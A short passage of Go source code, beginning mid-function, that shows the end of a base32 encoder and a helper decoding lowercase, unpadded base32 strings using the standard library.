	}
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	return strings.ToLower(encoded)
}

// decodeBase32 decodes lowercase base32 data without padding
func decodeBase32(encoded string) ([]byte, error) {
	if len(encoded) == 0 {
		return []byte{}, nil
	}
	encoded = strings.ToUpper(encoded)
	return base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(encoded)
}
